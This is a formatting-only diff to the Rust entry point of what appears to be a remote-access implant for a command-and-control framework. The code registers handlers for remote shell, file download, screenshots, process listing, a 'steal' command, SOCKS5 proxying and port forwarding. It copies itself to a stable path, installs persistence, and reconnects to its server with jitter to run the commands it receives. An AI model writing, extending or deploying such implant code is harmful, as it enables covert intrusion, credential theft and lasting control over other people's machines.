@@ -1,15 +1,19 @@
-mod config;
-mod transport;
 mod checkin;
-mod platform;
-mod persistence;
-mod dispatcher;
 mod commands;
-#[cfg(feature = "http-transport")] mod tunnel_client;
-
-use commands::{shell, file_list, file_download, screenshot, process_list, persist_status, persist_remove, steal};
+mod config;
+mod dispatcher;
+mod persistence;
+mod platform;
+mod transport;
 #[cfg(feature = "http-transport")]
-use commands::{socks5, portfwd};
+mod tunnel_client;
+
+use commands::{
+    file_download, file_list, persist_remove, persist_status, process_list, screenshot, shell,
+    steal,
+};
+#[cfg(feature = "http-transport")]
+use commands::{portfwd, socks5};
 use oxide_shared::packet::Packet;
 use rand::Rng;
 use std::time::Duration;
@@ -29,19 +33,32 @@ async fn main() -> anyhow::Result<()> {
     let mut dispatch = dispatcher::Dispatcher::new();
     dispatch.register("shell", Box::new(shell::ShellHandler));
     dispatch.register("file_list", Box::new(file_list::FileListHandler));
-    dispatch.register("file_download", Box::new(file_download::FileDownloadHandler));
+    dispatch.register(
+        "file_download",
+        Box::new(file_download::FileDownloadHandler),
+    );
     dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
     dispatch.register("process_list", Box::new(process_list::ProcessListHandler));
-    dispatch.register("persist_status", Box::new(persist_status::PersistStatusHandler));
-    dispatch.register("persist_remove", Box::new(persist_remove::PersistRemoveHandler));
+    dispatch.register(
+        "persist_status",
+        Box::new(persist_status::PersistStatusHandler),
+    );
+    dispatch.register(
+        "persist_remove",
+        Box::new(persist_remove::PersistRemoveHandler),
+    );
     dispatch.register("steal", Box::new(steal::StealHandler));
 
     #[cfg(feature = "http-transport")]
     {
-        dispatch.register("socks5_start",
-            Box::new(socks5::Socks5StartHandler::new(config.clone())));
-        dispatch.register("portfwd_add",
-            Box::new(portfwd::PortFwdHandler::new(config.clone())));
+        dispatch.register(
+            "socks5_start",
+            Box::new(socks5::Socks5StartHandler::new(config.clone())),
+        );
+        dispatch.register(
+            "portfwd_add",
+            Box::new(portfwd::PortFwdHandler::new(config.clone())),
+        );
     }
 
     let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
@@ -54,7 +71,11 @@ async fn main() -> anyhow::Result<()> {
         if r.installed {
             eprintln!("[+] Persistence installed: {}", r.name);
         } else {
-            eprintln!("[!] Persistence failed ({}): {}", r.name, r.error.as_deref().unwrap_or("?"));
+            eprintln!(
+                "[!] Persistence failed ({}): {}",
+                r.name,
+                r.error.as_deref().unwrap_or("?")
+            );
         }
     }
 
@@ -82,7 +103,9 @@ async fn main() -> anyhow::Result<()> {
             Err(e) => Err(e),
         };
 
-        if let Err(e) = result { eprintln!("[!] Session ended: {e}"); }
+        if let Err(e) = result {
+            eprintln!("[!] Session ended: {e}");
+        }
         let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
         let delay = backoff * (1.0 + jitter);
         eprintln!("[*] Reconnecting in {delay:.1}s...");
@@ -106,9 +129,13 @@ async fn run_tls_session(
     loop {
         let packet = transport.receive().await?;
         match packet.packet_type.as_str() {
-            "command" => { transport.send(dispatch.dispatch(&packet)).await?; }
+            "command" => {
+                transport.send(dispatch.dispatch(&packet)).await?;
+            }
             "heartbeat" => {
-                transport.send(Packet::new("heartbeat", serde_json::json!({}))).await?;
+                transport
+                    .send(Packet::new("heartbeat", serde_json::json!({})))
+                    .await?;
             }
             other => eprintln!("[!] Unknown packet type: {other}"),
         }
